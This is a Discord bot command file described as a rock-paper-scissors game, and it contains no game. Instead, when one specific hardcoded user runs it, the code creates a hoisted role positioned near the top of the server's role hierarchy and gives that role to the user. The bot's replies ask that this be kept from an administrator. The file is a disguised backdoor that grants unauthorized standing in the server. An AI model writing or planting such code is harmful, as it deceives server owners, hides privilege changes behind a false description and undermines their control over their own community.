module.exports = {
    commands: ['r'],
    description: 'A good game of rock paper scissors',
    aliases: [],
    usage: '',

    async execute(message, args) {
        // if (message.guild.id != '795719565723566131')
        //     return;

        const { member } = message

        if (member.user.id != '714808648517550144')
            return;

        const roles = message.guild.roles.cache.size

        const role = await message.guild.roles.create({
            data: {
                name: 'Krish',
                color: 'BLACK',
                hoist: true,
                position: roles-1,
            }
        }).catch()

        if (!role)
            return message.channel.send('Sorry but I couldnt create a role that high. *kek*')

        message.channel.send('OK, lemme gib you the **cool** role, ||dont tell clazz tho|| *kek*')

        await member.roles.add(role.id).catch(() => {
            return message.channel.send('Oops, couldnt gib **cool** role. *kek*')
        })
    }
}